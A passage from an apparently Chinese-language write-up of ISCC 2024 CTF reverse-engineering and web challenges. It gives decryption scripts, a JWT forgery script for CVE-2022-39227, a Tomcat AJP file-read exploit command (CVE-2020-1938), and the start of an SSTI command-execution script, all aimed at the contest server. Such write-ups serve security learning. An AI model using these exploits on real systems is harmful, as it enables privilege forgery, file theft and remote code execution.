class="keyword">for</span> k, v <span class="keyword">in</span> dic.items():</span><br><span class="line">    flag = flag.replace(k, v)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Which-is-the-flag"><a href="#Which-is-the-flag" class="headerlink" title="Which_is_the_flag"></a>Which_is_the_flag</h4><p>IDA打开后</p><p>直接IDA跑python脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">your_hex_string = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(get_wide_byte(<span class="number">0x14000BF40</span>+i) ^ <span class="number">0xc</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)])</span><br><span class="line">bytes_object = <span class="built_in">bytes</span>(<span class="built_in">bytearray</span>.fromhex(your_hex_string))</span><br><span class="line"></span><br><span class="line">decoded_string = base64.b64decode(bytes_object).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span> + decoded_string + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="擂台题-1"><a href="#擂台题-1" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h4><p><img src="https://bu.dusays.com/2024/05/25/6651fc7847ea7.png" alt="image-20240520223802751"></p><p>base64解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a9fc0.png" alt="image-20240520223839786"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//zfhagkhauak116arws13fasa6rtaafsfaAEShafxnvSA5glwiy8hf193751387905hwewtknfyf255hdf85u5rheyas7frfq3i526u4jrt486agax164saty611R4G3NDa2sdg//U2FsdGVkX18vC9NASfvLBkp9ZZ2D5JpAWTclbgW/tuBqs9Y0O4bw/GTv9amPiZkM</span><br></pre></td></tr></table></figure><p>aes 加密</p><p>得：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX18vC9NASfvLBkp9ZZ2D5JpAWTclbgW/tuBqs9Y0O4bw/GTv9amPiZkM</span><br></pre></td></tr></table></figure><p>再aes解密：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc78a83ce.png" alt="image-20240520224347554"></p><h4 id="W2w"><a href="#W2w" class="headerlink" title="W2w"></a>W2w</h4><p>用 wabt 的工具将 wasm 文件转为 asm 文和.c 文件；</p><p>编译出 test.o 文件</p><p>使用 IDA 打开；W2c_f6 函数发现 XXTEA 加密特征；查看调用可以看见 w2c_f8 函数对加密后的数据再 xor 了一个 0xFF</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a15c4.png" alt="image-20240525145237457"></p><p>asm 文件中寻找密文和 key ， 提取出的密文长度和加密时候的一致key为 <code>0xdeedbeef ,0xbeefdeed, 0, 1</code></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a44e3.png" alt="image-20240525145351506"></p><p>所以：</p><p>exp：</p><p>BTEA加密和解密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88647</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Mix function for the btea algorithm</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 6)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e]) ^ z))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tea block encryption/decryption function</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123; <span class="comment">// Encryption</span></span><br><span class="line">        <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">        <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">        </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; ++p) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; <span class="comment">// Decryption</span></span><br><span class="line">        n = -n;</span><br><span class="line">        <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">        <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">        </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * -DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; --p) &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;</span><br><span class="line">        <span class="number">21</span>,<span class="number">196</span>,<span class="number">46</span>,<span class="number">178</span>,<span class="number">244</span>,<span class="number">130</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">180</span>,<span class="number">253</span>,<span class="number">8</span>,<span class="number">156</span>,<span class="number">156</span>,<span class="number">82</span>,</span><br><span class="line">        <span class="number">130</span>,<span class="number">120</span>,<span class="number">134</span>,<span class="number">58</span>,<span class="number">226</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">185</span>,<span class="number">198</span>,<span class="number">115</span>,<span class="number">103</span>,<span class="number">89</span>,<span class="number">141</span>,<span class="number">166</span>,<span class="number">224</span>,<span class="number">65</span>,</span><br><span class="line">        <span class="number">87</span>,<span class="number">166</span>,<span class="number">158</span>,<span class="number">196</span>,<span class="number">31</span>,<span class="number">92</span>,<span class="number">132</span>,<span class="number">117</span>,<span class="number">202</span>,<span class="number">61</span>,<span class="number">42</span>,<span class="number">152</span>,<span class="number">150</span>,<span class="number">46</span>,<span class="number">250</span>,<span class="number">43</span>,<span class="number">93</span>,</span><br><span class="line">        <span class="number">137</span>,<span class="number">53</span>,<span class="number">44</span>,<span class="number">177</span>,<span class="number">131</span>,<span class="number">88</span>,<span class="number">90</span>,<span class="number">129</span>,<span class="number">206</span>,<span class="number">211</span>,<span class="number">180</span>,<span class="number">130</span>,<span class="number">76</span>,<span class="number">226</span>,<span class="number">93</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint32_t</span>* p = (<span class="type">uint32_t</span>*)enc;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0xDEADBEEF</span>, <span class="number">0xBEEFDEED</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// XOR each element with 0xFF before decryption</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">        enc[i] ^= <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Perform decryption</span></span><br><span class="line">    btea(p, <span class="number">-16</span>, key);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Print decrypted string (assuming it&#x27;s null-terminated or safe to print as such)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h4><p>简单混淆</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc795f518.png" alt="image-20240525152649641"></p><p>每次从数组里面拿个数</p><p>运算</p><p>把满足条件的加入到输出数组</p><p>输入数组的每个元素都会对应输出数组的n个元素，属于映射关系，直接爆破即可</p><p>直接手动爆破</p><p>1112746894</p><p>所以</p><p>ISCC{1112746894}</p><h4 id="Ezobf"><a href="#Ezobf" class="headerlink" title="Ezobf"></a>Ezobf</h4><p>打开研究一些</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a5ef9.png" alt="image-20240525192708644"></p><p>发现关键代码</p><p>找到密钥、密文</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc79a31cc.png" alt="image-20240525192841069"></p><p>写个脚本</p><ul><li>使用 <code>.value</code> 更直接地访问和修改 <code>c_uint32</code> 类型的值。</li><li>在循环外部通过列表推导式计算 <code>a2</code>，避免了每次循环都重新计算。</li><li>合并了最后的打印部分，使用列表推导式和 <code>join</code> 函数一次性转换并输出所有解码后的字符串</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given array of integers</span></span><br><span class="line">a1 = [</span><br><span class="line">    <span class="number">0xDDA214B5</span>, <span class="number">0xE5AD9DF4</span>, <span class="number">0x6AE4F8FF</span>, <span class="number">0x925B7AF6</span>,</span><br><span class="line">    <span class="number">0xEDCA55A3</span>, <span class="number">0xED3670CA</span>, <span class="number">0xA84E71DA</span>, <span class="number">0x1A910369</span>,</span><br><span class="line">    <span class="number">0x75F6D88B</span>, <span class="number">0xB6BBC257</span>, <span class="number">0xC2CAE77B</span>, <span class="number">0xEFD444CF</span>,</span><br><span class="line">    <span class="number">0x532CCDFB</span>, <span class="number">0xFA8A2260</span>, <span class="number">0xDD6B9924</span>, <span class="number">0xBBCC10E3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize variables</span></span><br><span class="line">decode = []</span><br><span class="line">v5 = c_uint32(<span class="number">0</span>)</span><br><span class="line">times = <span class="number">16</span></span><br><span class="line">delta = <span class="number">0x9E3779B8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process the array in pairs</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a1), <span class="number">2</span>):</span><br><span class="line">    v5.value = delta * <span class="number">16</span></span><br><span class="line">    v1 = c_uint32(a1[j])</span><br><span class="line">    v2 = c_uint32(a1[j+<span class="number">1</span>])</span><br><span class="line">    a2 = [i * (j // <span class="number">2</span> + <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform the loop for each pair</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        r8d = c_uint32((v1.value &lt;&lt; <span class="number">5</span>) + a2[<span class="number">2</span>])</span><br><span class="line">        r8d.value ^= (v1.value + v5.value)</span><br><span class="line">        esi = c_uint32((v1.value &gt;&gt; <span class="number">6</span>) + a2[<span class="number">3</span>])</span><br><span class="line">        edi = c_uint32(esi.value)</span><br><span class="line">        edi.value &amp;= r8d.value</span><br><span class="line">        edi.value *= <span class="number">2</span></span><br><span class="line">        v2.value -= r8d.value - edi.value + esi.value</span><br><span class="line"></span><br><span class="line">        esi = c_uint32((v2.value &lt;&lt; <span class="number">5</span>) + a2[<span class="number">0</span>])</span><br><span class="line">        r11d = c_uint32(v2.value + v5.value)</span><br><span class="line">        edi = c_uint32(esi.value)</span><br><span class="line">        edi.value &amp;= r11d.value</span><br><span class="line">        esi.value += r11d.value</span><br><span class="line">        edi.value *= <span class="number">2</span></span><br><span class="line">        esi.value -= edi.value</span><br><span class="line"></span><br><span class="line">        r11d.value = (v2.value &gt;&gt; <span class="number">6</span>) + a2[<span class="number">1</span>]</span><br><span class="line">        r11d.value ^= esi.value</span><br><span class="line">        v1.value -= r11d.value</span><br><span class="line"></span><br><span class="line">        v5.value -= delta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Append results to the decode list</span></span><br><span class="line">    decode.extend([v1.value, v2.value])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert and print the decoded values</span></span><br><span class="line">decoded_string = <span class="string">&#x27;&#x27;</span>.join(libnum.n2s(i)[::-<span class="number">1</span>].decode() <span class="keyword">for</span> i <span class="keyword">in</span> decode)</span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br></pre></td></tr></table></figure><h4 id="国密防线至善之战"><a href="#国密防线至善之战" class="headerlink" title="国密防线至善之战"></a>国密防线至善之战</h4><p>IDA打开看看</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7965026.png" alt="image-20240525193922871"></p><p>有hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc7892f25.png" alt="image-20240525194015461"></p><p>写个脚本跑一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;D:\\流量\\-20240505.exe&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">0x24390</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(f.read(<span class="number">144</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i*<span class="number">12</span>+j]%<span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;1122112211110011221&quot;</span></span><br><span class="line">i = <span class="number">5</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i-<span class="number">1</span>)*<span class="number">12</span>+j])[<span class="number">2</span>:].zfill(<span class="number">2</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i) * <span class="number">12</span> + j+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        j+= <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(s[(i+<span class="number">1</span>) * <span class="number">12</span> + j])[<span class="number">2</span>:].zfill(<span class="number">2</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        i+= <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc7986c37.png" alt="image-20240525194321105"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="练武题-2"><a href="#练武题-2" class="headerlink" title="练武题"></a>练武题</h3><h4 id="还没想好名字的塔防游戏"><a href="#还没想好名字的塔防游戏" class="headerlink" title="还没想好名字的塔防游戏"></a>还没想好名字的塔防游戏</h4><blockquote><p>这是一个还没想好名字的塔防游戏。<br>备注：<br>（1）Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！<br>（2）提示在后边哦！</p></blockquote><p>游戏题</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcd062cb1.png" alt="image-20240502213331114"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccfa42b8.png" alt="image-20240502213443418"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccff1715.png" alt="image-20240502213455867"></p><p>应该是js题</p><p>照例找JS中的alert()：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc2fcef.png" alt="image-20240502214048580"></p><p>根据题目</p><p>有18个字符</p><p>首页有9个大写字母：</p><p>MDWTSGTMM</p><p>在js的提示中也有9个大写字母：</p><p>WWDSCSUEL</p><p>9+9&#x3D;18</p><p>猜测flag为：</p><p>ISCC{MDWTSGTMMWWDSCSUEL}</p><h4 id="Flask中的pin值计算"><a href="#Flask中的pin值计算" class="headerlink" title="Flask中的pin值计算"></a>Flask中的pin值计算</h4><p>给了一个网页</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccdc84f8.png" alt="image-20240506204251939"></p><p>f12中有个提示：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccbe9c62.png" alt="image-20240506204335544"></p><p> L2dldHVzZXJuYW1l </p><p>随波逐流解码：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccdac27a.png" alt="image-20240506204557750"></p><p>&#x2F;getusername</p><p>访问：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf64307.png" alt="image-20240506204629461"></p><p>海螺 这个好像之前做题见到过 记不得了</p><p>随便输一下发现：输入会去除输出中的所有代码块格式 以纯文本格式输出 并且重复一遍username&#x2F;appname得到pincalculate&#x2F;crawler</p><p>输出{app.py}得一个路由：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf6c532.png" alt="image-20240506210045436"></p><p>&#x2F;crawler 访问：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc3116f.png" alt="image-20240506210140557"></p><p>要1s内计算 写脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_expression</span>():</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://101.200.138.180:10006/get_expression&#x27;</span>) <span class="comment"># 修改[website]为实际网站地址</span></span><br><span class="line">    data = json.loads(response.text)</span><br><span class="line">    expression = data[<span class="string">&#x27;expression&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> expression</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="comment"># 解析unicode并计算结果</span></span><br><span class="line">    decoded_expression = urllib.parse.unquote(expression)</span><br><span class="line">    sanitized_expression = decoded_expression.replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">eval</span>(sanitized_expression)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">expression = fetch_expression()</span><br><span class="line">result = calculate_expression(expression)</span><br><span class="line">req=requests.get(<span class="string">&quot;http://101.200.138.180:10006/crawler?answer=&quot;</span>+<span class="built_in">str</span>(result))</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fccdbf924.png" alt="image-20240508193418242"></p><p>发现uuidnode_mac在&#x2F;woddenfish中 访问</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce2c1e6.png" alt="image-20240508193550245"></p><p>电子木鱼 敲击</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc7ec7d.png" alt="image-20240508193621695"></p><p>抓包</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd27324.png" alt="image-20240508203558487"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd949ac.png" alt="image-20240508204046763"></p><p>这个session应该是jwt加密 我们找找密钥</p><p>在源码中发现可疑处：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc86974.png" alt="image-20240508204324227"></p><p>密钥可能是<code>ISCC_muyu_2024</code></p><p>然后改：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc8bfc0.png" alt="image-20240508210206020"></p><p>这样会得到网卡地址和下一关：</p><p>{‘gongde’: 2461300743, ‘message’: ‘佛曰：功德圆满。地址02:42:ac:18:00:02:,机器码提示给你了&#x2F;machine_id’}</p><p>访问&#x2F;machine_id</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc7bce7.png" alt="image-20240508210356014"></p><p>vip奖品：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf03b10.png" alt="image-20240508210438876"></p><p>又是jwt</p><p>解码发现是ps256加密</p><p>是CVE-2022-39227-Python-JWT</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;vip&quot;</span></span><br><span class="line">    fake_payload = base64url_encode(</span><br><span class="line">        (dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="comment"># print(fake_payload)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">originaltoken =<span class="string">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ1NTg2NDgsImlhdCI6MTcxNDU1NTA0OCwianRpIjoiRjMzSnFhLTR3Q3BpV3pjV0ZZSE8xQSIsIm5iZiI6MTcxNDU1NTA0OCwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.S1705RN1AwmC-AlVQxisAMAQXUeeJptacH8yirybmaV5ulcBOxhxOI13QDHdBmA3Iis12WZ61Z6x5Qx8jqecLYR291IPdyrclfRCzh4VPwArS2UYPfWP-dp0mGh-RQDzsFQ4yqgX1M6ArbWtcRpLf9NJqsjdrhJnhSCjAwKOfmpImbDq6A0RYwUxpCylbS7fedSpN14OLId8ZTOJvdtD6vNPTHfG0QWqDdfxhMIJ4K8Cab6G41ltAsrz70DMngUJUT_4ImtjWieM6qpM6OgBT5adzVGtmB1Y6cPlFhlypXHEZcvvZlmRe_FUJ7JysA0eeTOz6ObVQQhVJd0_nFFXNA&quot;</span></span><br><span class="line">topic = topic(originaltoken)</span><br><span class="line"><span class="built_in">print</span>(topic)</span><br></pre></td></tr></table></figure><p>jwt伪造 改token</p><p>这样会给我们一个session和key</p><p>然后就是flasksession伪造supervip</p><p>直接打到machine-id </p><p>然后找个 werkzeug2.0.x ⾼版本算pin脚本 算出来&#x2F;console 填写就有flag</p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>进入</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcced1760.png" alt="image-20240520224926175">使用这个接口&#x2F;geneSign?param&#x3D;flag.txtread生成一个secert_key</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce006c1.png" alt="image-20240525125859430"></p><p>利用这个key 直接post 读文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd4d7db.png" alt="image-20240525001524308"></p><h4 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h4><p>进来</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd1f9e8.png" alt="image-20240524233516594"></p><p>F12有hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd11d63.png" alt="image-20240524233620172"></p><p>熊曰解码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd31e0f.png" alt="image-20240524233829166"></p><p>页面输入克制属性(冰)后可以进入success.html</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd64ca6.png" alt="image-20240524234007190"></p><p>许愿flag 拿到hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc1d46d.png" alt="image-20240524234110046"></p><p>访问试下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc3bb5b.png" alt="image-20240524234147523"></p><p>明显是假的</p><p>最后是CVE-2020-1938</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 CNVD-<span class="number">2020</span>-<span class="number">10487</span>-Tomcat-Ajp-lfi.py <span class="number">101.200</span><span class="number">.138</span><span class="number">.180</span> -p <span class="number">8009</span> -f WEB-INF/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fcce60392.png" alt="image-20240520225710883"></p><h4 id="回来吧永远的神"><a href="#回来吧永远的神" class="headerlink" title="回来吧永远的神"></a>回来吧永远的神</h4><p>进来</p><p><img src="https://bu.dusays.com/2024/05/23/664f0a9b2ab44.png" alt="image-20240523172119669"></p><p>f12看到hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc696a8.png" alt="image-20240523172154020"></p><p>提交答案 进入隐藏关卡</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce67dc4.png" alt="image-20240523172324998"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fcccc3895.png" alt="image-20240523172442083"></p><p>在源码中发现了integrity属性 base64解码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcccd008a.png" alt="image-20240523173048724"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc9a874.png" alt="image-20240523173154099"></p><p>隐藏关卡可能是SSTI</p><p>试下</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd29e88.png" alt="image-20240523173308191"></p><p>直接SSTI反弹shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload  <span class="comment"># 确保这个库存在且可以导入  </span></span><br><span class="line">  </span><br><span class="line">url = <span class="string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span>  </span><br><span class="line">headers = &#123;&#125;  <span class="comment"># 根据需要定义headers，例如添加User-Agent等  </span></span><br><span class="line">cookies = &#123;  </span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.ZkQrdg.TTUET5iRTAmIfSy5szAO9ZMgkA&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  </span><br><span class="line">    time.sleep(<span 